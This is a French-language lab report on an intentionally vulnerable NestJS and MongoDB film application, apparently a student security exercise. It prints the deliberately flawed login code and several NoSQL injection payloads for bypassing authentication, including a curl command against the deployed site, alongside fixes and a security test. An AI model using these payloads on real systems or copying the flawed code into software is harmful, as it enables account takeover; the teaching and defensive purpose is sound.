# 🚨 Rapport de Sécurité - Vulnérabilité d'Injection NoSQL

**Projet:** TP Sécurité - Application Web NestJS  
**Date:** Janvier 2025  
**Type de vulnérabilité:** Injection NoSQL (MongoDB)  
**Niveau de criticité:** 🔴 **CRITIQUE**

---

## 📋 Table des Matières

1. [Présentation du Projet](#-présentation-du-projet)
2. [Guide de Déploiement](#-guide-de-déploiement)
3. [Architecture et Stack Technique](#-architecture-et-stack-technique)
4. [Vulnérabilité Identifiée](#-vulnérabilité-identifiée)
5. [Analyse Technique de la Faille](#-analyse-technique-de-la-faille)
6. [Exploits Démontrés](#-exploits-démontrés)
7. [Impact et Risques](#-impact-et-risques)
8. [Recommandations de Correction](#-recommandations-de-correction)
9. [Annexes](#-annexes)

---

## 🎯 Présentation du Projet

### Description
Application web de gestion de films avec système d'authentification JWT et fonctionnalité de wishlist. L'application est **intentionnellement vulnérable** pour démontrer les risques d'injection NoSQL.

### Fonctionnalités principales
- ✅ Système d'authentification JWT complet
- ✅ Gestion des utilisateurs avec rôles (admin, user, moderator)
- ✅ Catalogue de films (10 films pré-chargés)
- ✅ Système de wishlist personnalisée
- ✅ Interface d'administration
- 🚨 **Endpoint vulnérable** : `/auth/login-vulnerable`

### URLs d'accès
- **Production (Render):** https://tp-secu.onrender.com/
- **Test de vulnérabilité:** https://tp-secu.onrender.com/nosql-test.html
- **Dashboard admin:** https://tp-secu.onrender.com/dashboard.html

---

## 🚀 Guide de Déploiement

### Prérequis
1. **Compte GitHub** (gratuit)
2. **Compte Render** (gratuit) - [https://render.com](https://render.com)
3. **Compte MongoDB Atlas** (gratuit) - [https://cloud.mongodb.com](https://cloud.mongodb.com)

### Étape 1: Préparation du code
```bash
# Cloner le repository
git clone <votre-repo-url>
cd tp-secu

# Installer les dépendances
npm install

# Variables d'environnement nécessaires
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/tp-secu
JWT_SECRET=your-super-secret-jwt-key-here
PORT=3000
```

### Étape 2: Configuration MongoDB Atlas
1. **Créer un cluster** MongoDB Atlas (gratuit)
2. **Configurer l'accès réseau** : 
   - Aller dans `Network Access`
   - Ajouter l'IP `0.0.0.0/0` (autorise toutes les IPs - nécessaire pour Render)
3. **Créer un utilisateur** de base de données
4. **Récupérer l'URI** de connexion

### Étape 3: Déploiement sur Render
1. **Créer un compte** sur [Render](https://render.com)
2. **Connecter votre repo** GitHub
3. **Créer un Web Service** avec ces paramètres :
   ```
   Name: tp-secu
   Branch: main
   Build Command: npm install
   Start Command: npm run start:prod
   ```
4. **Ajouter les variables d'environnement** :
   - `MONGODB_URI` : votre URI MongoDB Atlas
   - `JWT_SECRET` : clé secrète pour JWT
   - `PORT` : 3000

### Étape 4: Configuration automatique
L'application se configure automatiquement au premier démarrage :
- ✅ **Seed automatique** des 3 comptes de test
- ✅ **Seed automatique** de 10 films
- ✅ **Création des index** MongoDB

### Comptes de test disponibles
```javascript
// Admin
Email: admin@test.com
Password: admin123
Role: admin

// Utilisateur
Email: user@test.com  
Password: user123
Role: user

// Modérateur
Email: moderator@test.com
Password: moderator123
Role: moderator
```

---

## 🏗️ Architecture et Stack Technique

### Backend
- **Framework:** NestJS (Node.js/TypeScript)
- **Base de données:** MongoDB avec Mongoose
- **Authentification:** JWT + Passport.js
- **Validation:** class-validator
- **Chiffrement:** bcrypt

### Frontend
- **Technologies:** HTML5, CSS3, JavaScript ES6+
- **Design:** CSS moderne responsive
- **Architecture:** SPA (Single Page Application)

### Infrastructure
- **Hébergement:** Render (Cloud Platform)
- **Base de données:** MongoDB Atlas (Cloud)
- **CI/CD:** Auto-déploiement via GitHub

### Structure du projet
```
tp-secu/
├── src/
│   ├── auth/                 # Module d'authentification
│   │   ├── auth.controller.ts # ⚠️ Contient l'endpoint vulnérable
│   │   ├── auth.service.ts   # ⚠️ Logique métier vulnérable
│   │   └── ...
│   ├── films/               # Module films
│   ├── schemas/             # Schémas MongoDB
│   └── ...
├── public/                  # Frontend statique
│   ├── login.html
│   ├── dashboard.html
│   ├── films.html
│   ├── nosql-test.html      # 🚨 Page de test vulnérabilités
│   └── ...
└── package.json
```

---

## 🚨 Vulnérabilité Identifiée

### Type de vulnérabilité
**Injection NoSQL (CWE-943)** - Faille de sécurité critique permettant l'injection d'opérateurs MongoDB dans les requêtes de base de données.

### Localisation
- **Endpoint vulnérable:** `POST /auth/login-vulnerable`
- **Fichiers concernés:**
  - `src/auth/auth.controller.ts` (lignes 24-44)
  - `src/auth/auth.service.ts` (lignes 28-58)

### Principe de la faille
L'endpoint accepte directement des objets JSON complexes sans validation, permettant l'injection d'opérateurs MongoDB tels que `$ne`, `$regex`, `$exists`, etc.

---

## 🔬 Analyse Technique de la Faille

### Code vulnérable - Controller
```typescript
// ENDPOINT VULNÉRABLE dans auth.controller.ts
@Post('login-vulnerable')
async loginVulnerable(@Body() credentials: any) {
  // FAILLE: accepte n'importe quel objet JSON
  const user = await this.authService.validateUserVulnerable(
    credentials.email, 
    credentials.password
  );
  // ...
}
```

### Code vulnérable - Service  
```typescript
// MÉTHODE VULNÉRABLE dans auth.service.ts
async validateUserVulnerable(email: any, password: any): Promise<any> {
  // FAILLE: utilise directement les paramètres dans MongoDB
  const user = await this.userModel.findOne({ 
    email: email,                    // ⚠️ Injection possible ici
    $where: `this.password != null`  // ⚠️ Injection JavaScript possible
  }).select('+password');

  if (user) {
    if (typeof password === 'string') {
      // Vérification normale du mot de passe
      const isValidPassword = await bcrypt.compare(password, user.password);
      if (isValidPassword) return result;
    } else {
      // FAILLE: Si password n'est pas une string, bypass de la vérification
      console.log('🚨 PASSWORD BYPASS DETECTED!');
      return result; // ⚠️ Accès accordé sans vérification!
    }
  }
  return null;
}
```

### Problèmes identifiés

1. **Absence de validation d'entrée** - Les paramètres `email` et `password` acceptent n'importe quel type de données
2. **Injection directe dans MongoDB** - Les objets JSON sont passés directement à `findOne()`
3. **Bypass de vérification** - Le mot de passe peut être contourné avec des objets non-string
4. **Utilisation de `$where`** - Permet l'injection de code JavaScript
5. **Pas de sanitisation** - Aucune protection contre les opérateurs MongoDB

---

## 💀 Exploits Démontrés

### Page de test interactive
L'application inclut une page de test : `/nosql-test.html` avec 4 exploits automatisés.

### Exploit #1: Contournement d'authentification complet
```json
POST /auth/login-vulnerable
Content-Type: application/json

{
  "email": {"$ne": null},
  "password": {"$ne": null}
}
```
**Résultat:** Authentification en tant que premier utilisateur trouvé

### Exploit #2: Ciblage d'utilisateur spécifique
```json
{
  "email": "admin@test.com",
  "password": {"$ne": null}
}
```
**Résultat:** Accès au compte admin sans connaître le mot de passe

### Exploit #3: Attaque basée sur les rôles
```json
{
  "email": {"$regex": "admin"},
  "password": {"$ne": null}
}
```
**Résultat:** Accès à tout compte contenant "admin" dans l'email

### Exploit #4: Extraction de données
```json
{
  "email": {"$exists": true},
  "password": {"$ne": null}
}
```
**Résultat:** Énumération et accès aux comptes utilisateurs

### Exploitation avec curl
```bash
# Test de l'exploit sur l'environnement de production
curl -X POST https://tp-secu.onrender.com/auth/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$ne": null},
    "password": {"$ne": null}
  }'

# Réponse attendue : token JWT valide + informations utilisateur
```

---

## ⚡ Impact et Risques

### Impact immédiat
- 🔴 **Contournement complet de l'authentification**
- 🔴 **Accès non autorisé aux comptes utilisateurs**
- 🔴 **Élévation de privilèges** (accès admin)
- 🔴 **Exposition des données sensibles**

### Risques métier
- **Confidentialité** : Accès aux données utilisateurs et films
- **Intégrité** : Modification non autorisée des wishlists
- **Disponibilité** : Possible déni de service via requêtes complexes
- **Conformité** : Violation potentielle du RGPD

### Scénarios d'attaque réels
1. **Takeover de compte admin** → Contrôle total de l'application
2. **Vol de données utilisateurs** → Récupération des emails et rôles
3. **Manipulation des wishlists** → Modification des préférences utilisateurs
4. **Reconnaissance système** → Énumération des utilisateurs

### Score de criticité
- **CVSS Base Score:** 9.8/10 (CRITIQUE)
- **Facilité d'exploitation:** Très élevée (script automatisé disponible)
- **Impact:** Contrôle total du système d'authentification

---

## 🛡️ Recommandations de Correction

### 1. Validation stricte des entrées
```typescript
// ✅ CORRECTION: Utiliser des DTOs typés
import { IsEmail, IsString, MinLength } from 'class-validator';

export class LoginDto {
  @IsEmail()
  email: string;

  @IsString()
  @MinLength(8)
  password: string;
}

// ✅ Contrôleur corrigé
@Post('login')
async login(@Body() loginDto: LoginDto) {
  // Les types sont maintenant garantis
  const user = await this.authService.validateUser(
    loginDto.email, 
    loginDto.password
  );
}
```

### 2. Sanitisation des requêtes MongoDB
```typescript
// ✅ Service sécurisé
async validateUser(email: string, password: string): Promise<any> {
  // Validation stricte des types
  if (typeof email !== 'string' || typeof password !== 'string') {
    throw new BadRequestException('Invalid input types');
  }

  // Requête sécurisée avec paramètres typés
  const user = await this.userModel.findOne({ 
    email: email // MongoDB traite correctement les strings
  }).select('+password');

  if (user && await bcrypt.compare(password, user.password)) {
    const { password: _, ...result } = user.toObject();
    return result;
  }
  return null;
}
```

### 3. Utilisation de mongoose-mongo-sanitize
```bash
npm install mongoose-mongo-sanitize
```

```typescript
import mongoSanitize from 'mongoose-mongo-sanitize';

// Middleware global de sanitisation
app.use(mongoSanitize());
```

### 4. Configuration de sécurité supplémentaire
```typescript
// Helmet pour les headers de sécurité
import helmet from 'helmet';
app.use(helmet());

// Rate limiting
import rateLimit from 'express-rate-limit';
app.use(rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // max 100 requêtes par IP
}));

// Validation globale des DTOs
app.useGlobalPipes(new ValidationPipe({
  whitelist: true,
  forbidNonWhitelisted: true,
  transform: true
}));
```

### 5. Tests de sécurité automatisés
```typescript
// Test unitaire de sécurité
describe('AuthController Security', () => {
  it('should reject NoSQL injection attempts', async () => {
    const maliciousPayload = {
      email: { $ne: null },
      password: { $ne: null }
    };

    await request(app)
      .post('/auth/login')
      .send(maliciousPayload)
      .expect(400); // Bad Request attendu
  });
});
```

---

## 📊 Annexes

### Annexe A: Logs de sécurité
```
[🚨 VULNERABLE QUERY] { email: { '$ne': null }, password: { '$ne': null } }
[🚨 PASSWORD BYPASS DETECTED!] User: admin@test.com
[✅ JWT GENERATED] Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### Annexe B: Requêtes HTTP de test
```http
### Exploit de base
POST {{host}}/auth/login-vulnerable
Content-Type: application/json

{
  "email": {"$ne": null},
  "password": {"$ne": null}
}

### Ciblage admin
POST {{host}}/auth/login-vulnerable
Content-Type: application/json

{
  "email": "admin@test.com",
  "password": {"$ne": null}
}
```

### Annexe C: Réponses serveur
```json
{
  "success": true,
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": "60f4d2e5c8a8b830d8e4a1b2",
    "email": "admin@test.com",
    "role": "admin",
    "createdAt": "2024-01-15T10:30:00.000Z"
  }
}
```

### Annexe D: Structure de la base de données
```javascript
// Collection users
{
  "_id": ObjectId("..."),
  "email": "admin@test.com",
  "password": "$2b$10$hashed_password...",
  "role": "admin",
  "createdAt": ISODate("...")
}

// Collection films
{
  "_id": ObjectId("..."),
  "title": "Inception",
  "director": "Christopher Nolan",
  "year": 2010,
  "genre": "Sci-Fi",
  "description": "..."
}

// Collection wishlists
{
  "_id": ObjectId("..."),
  "userId": ObjectId("..."),
  "filmId": ObjectId("..."),
  "addedAt": ISODate("...")
}
```

---

## 🎯 Conclusion

Cette démonstration illustre les **dangers critiques** des injections NoSQL dans les applications web modernes. La vulnérabilité identifiée permet un **contournement complet du système d'authentification**, mettant en péril la sécurité de l'ensemble de l'application.

### Points clés à retenir :
1. ✅ **Toujours valider et typer** les entrées utilisateur
2. ✅ **Utiliser des DTOs** avec class-validator
3. ✅ **Sanitiser** les données avant les requêtes de base
4. ✅ **Tester** régulièrement les vulnérabilités de sécurité
5. ✅ **Implémenter** des mécanismes de détection d'intrusion

**La sécurité n'est pas une option, c'est une nécessité.**

---

*Rapport généré automatiquement - TP Sécurité - Janvier 2025* 